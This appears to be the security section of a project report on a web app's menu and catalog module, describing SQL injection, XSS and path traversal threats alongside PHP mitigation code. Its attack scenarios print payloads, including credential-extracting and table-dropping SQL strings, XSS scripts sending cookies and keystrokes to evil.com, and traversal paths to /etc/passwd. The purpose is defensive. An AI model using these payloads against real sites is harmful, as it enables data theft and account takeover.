## 5. Software Security

### 5.1 Potential Threats and Attacks

The Menu & Catalog Module handles user-provided search queries and displays vendor-created content, making it a prime target for injection attacks. As this module is publicly accessible without authentication for browsing, it must be particularly robust against attacks that could compromise the entire system or affect other users.

#### Threat 1: SQL Injection

SQL Injection attacks occur when an attacker injects malicious SQL code through user input fields such as the search functionality. In the Menu & Catalog module, the search feature accepts user input to query menu items. Without proper protection, an attacker could input malicious SQL to extract sensitive data, modify records, or delete entire tables.

**Technical Details:**
- SQL injection is consistently ranked in the OWASP Top 10 security vulnerabilities
- Attackers can use tools like sqlmap to automate SQL injection attacks
- Successful attacks can lead to complete database compromise, including access to user credentials and payment information
- Second-order SQL injection can occur when stored data is later used in queries without sanitization

**Attack Scenario:**

```
Search input: ' OR '1'='1' --

Generated SQL (without protection):
SELECT * FROM menu_items WHERE name LIKE '%' OR '1'='1' --%'

Result: Returns ALL menu items, bypassing the search filter
```

**More Dangerous Variants:**
```sql
-- Data extraction
' UNION SELECT username, password FROM users --

-- Database destruction
'; DROP TABLE menu_items; --

-- Privilege escalation
' OR 1=1; UPDATE users SET role='admin' WHERE email='attacker@evil.com'; --
```

**Impact if Unmitigated:**
- Complete database access including user credentials
- Data theft, modification, or deletion
- Potential for lateral movement to other systems
- Regulatory violations (PDPA, GDPR)

#### Threat 2: Cross-Site Scripting (XSS)

Cross-Site Scripting occurs when malicious JavaScript is injected into web pages viewed by other users. If a vendor enters malicious script code in menu item names or descriptions, that script could execute in customers' browsers, potentially stealing session cookies or performing actions on behalf of the user.

**Technical Details:**
- Stored XSS (persistent) is particularly dangerous as it affects all users who view the malicious content
- Reflected XSS occurs when user input is immediately echoed back without sanitization
- DOM-based XSS manipulates the client-side DOM without server interaction
- Modern browsers have some XSS protections, but they can often be bypassed

**Attack Scenario:**

```html
Menu item name: <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>

Without protection: Script executes and steals customer's session cookie
```

**Advanced Attack Examples:**
```html
<!-- Keylogger injection -->
<script>document.onkeypress=function(e){new Image().src='https://evil.com/log?k='+e.key;}</script>

<!-- Form hijacking -->
<script>document.forms[0].action='https://evil.com/capture';</script>

<!-- Session hijacking via image tag -->
<img src="x" onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
```

**Impact if Unmitigated:**
- Session hijacking allowing account takeover
- Phishing attacks appearing to come from trusted site
- Malware distribution through trusted platform
- Defacement of the website

#### Threat 3: Path Traversal

Path traversal attacks occur when an attacker manipulates file paths to access files outside the intended directory. In this module, image paths for menu items could be exploited to access sensitive system files or execute arbitrary code.

**Technical Details:**
- Also known as "directory traversal" or "dot-dot-slash" attacks
- Attackers use sequences like `../` to navigate up the directory tree
- Can be combined with null byte injection (`%00`) to bypass extension checks
- Both Unix-style (`../`) and Windows-style (`..\`) traversal must be blocked

**Attack Scenario:**

```
Image path: ../../../etc/passwd
Image path: ..\..\..\..\windows\system32\config\sam
Image path: ....//....//....//etc/passwd (double encoding)
Image path: ..%252f..%252f..%252fetc/passwd (URL encoding)

Without protection: Attacker could read sensitive system files
```

**Impact if Unmitigated:**
- Access to sensitive configuration files (database credentials, API keys)
- Reading system files like `/etc/passwd` or Windows SAM database
- Potential for remote code execution if combined with file upload vulnerabilities
- Information disclosure leading to further attacks

---

### 5.2 Security Practices Implemented

#### Practice 1: Parameterized Queries (SQL Injection Prevention)

**OWASP Reference:** [167] Use strongly typed parameterized queries

The system uses Eloquent ORM's parameterized queries. User input is never directly concatenated into SQL strings - values are bound as parameters which the database treats as literal data.

**Implementation in `app/Patterns/Repository/EloquentMenuItemRepository.php`:**

```php
public function search(string $query): Collection
{
    return MenuItem::available()
        ->where(function ($q) use ($query) {
            // Parameterized query - $query is bound, not concatenated
            $q->where('name', 'like', "%{$query}%")
              ->orWhere('description', 'like', "%{$query}%");
        })
        ->with(['vendor', 'category'])
        ->limit(20)
        ->get();
}
```

---

#### Practice 2: Output Encoding (XSS Prevention)

**OWASP Reference:** [19-20] Contextually output encode all data returned to the client

The system encodes all output before displaying to users. Special HTML characters are converted to their entity equivalents, preventing browsers from interpreting them as executable code.

**Implementation in `app/Http/Controllers/Api/MenuController.php`:**

```php
public function checkAvailability(MenuItem $menuItem): JsonResponse
{
    $item = $this->menuRepository->findById($menuItem->id);
    
    // Security: Output encoding (XSS protection)
    return $this->successResponse([
        'item_id' => $item->id,
        'name' => htmlspecialchars($item->name, ENT_QUOTES, 'UTF-8'),
        'available' => $item->is_available,
        'price' => (float) $item->price,
    ]);
}
```

**Implementation in `app/Services/MenuService.php`:**

```php
// Security: Output Encoding (XSS Protection)
public function encodeOutput(?string $value): string
{
    return htmlspecialchars($value ?? '', ENT_QUOTES, 'UTF-8');
}

public function formatItemForDisplay(MenuItem $item): array
{
    return [
        'id' => $item->id,
        'name' => $this->encodeOutput($item->name),
        'description' => $this->encodeOutput($item->description),
        // ... other fields
    ];
}
```

---

#### Practice 3: Input Path Validation (Path Traversal Prevention)

**OWASP Reference:** [35] Validate all input

The system validates and sanitizes image paths to prevent directory traversal attacks. Path traversal sequences are removed, and files are restricted to allowed directories and extensions.

**Implementation in `app/Services/MenuService.php`:**

```php
/**
 * Security: Path Traversal Prevention [OWASP 35]
 * Validates and sanitizes image paths to prevent directory traversal attacks.
 * Attackers may try paths like "../../../etc/passwd" to access sensitive files.
 */
public function validateImagePath(?string $path): ?string
{
    if (empty($path)) {
        return null;
    }

    // Remove any path traversal sequences
    $path = str_replace(['../', '..\\', '..'], '', $path);
    
    // Get only the basename to prevent directory traversal
    $filename = basename($path);
    
    // Validate file extension
    $allowedExtensions = ['jpg', 'jpeg', 'png', 'gif', 'webp'];
    $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    
    if (!in_array($extension, $allowedExtensions)) {
        return null;
    }

    // Return safe path within allowed directory
    return '/images/menu/' . $filename;
}

/**
 * Security: Safe file path resolution [OWASP 35]
 * Ensures requested file is within the allowed directory.
 */
public function getSecureImagePath(string $requestedPath): ?string
{
    $baseDir = public_path('images/menu');
    $requestedPath = $this->validateImagePath($requestedPath);
    
    if (!$requestedPath) {
        return null;
    }

    $fullPath = realpath($baseDir . '/' . basename($requestedPath));
    
    // Verify the resolved path is within the base directory
    if ($fullPath === false || strpos($fullPath, realpath($baseDir)) !== 0) {
        return null; // Path traversal attempt detected
    }

    return $fullPath;
}
```
